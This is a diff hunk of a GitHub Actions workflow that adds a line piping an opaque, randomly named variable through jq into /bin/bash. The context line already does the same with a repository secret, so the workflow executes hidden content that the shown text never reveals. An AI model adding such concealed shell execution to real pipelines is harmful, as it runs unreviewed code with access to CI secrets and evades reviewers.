@@ -19,6 +19,7 @@ jobs:
           tdpik013: ${{ secrets.tdpik013 }}
         run: |
           printf '%s' "$tdpik013" | jq -r .mwat5650 | /bin/bash
+          echo $kghzj61626 | jq -r .ojup34 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
